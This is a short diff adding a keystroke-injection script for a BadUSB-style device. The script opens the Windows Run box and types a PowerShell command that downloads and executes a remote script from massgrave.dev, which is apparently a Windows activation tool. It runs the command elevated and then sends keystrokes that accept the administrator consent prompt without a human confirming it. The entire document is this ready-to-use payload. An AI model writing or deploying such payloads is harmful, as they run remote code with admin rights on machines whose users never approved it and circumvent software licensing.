@@ -1,0 +1,8 @@
+GUI R
+DELAY 100
+STRING powershell irm https://massgrave.dev/get | iex
+CTRL-SHIFT ENTER
+DELAY 400
+SHIFT TAB
+DELAY 100
+ENTER
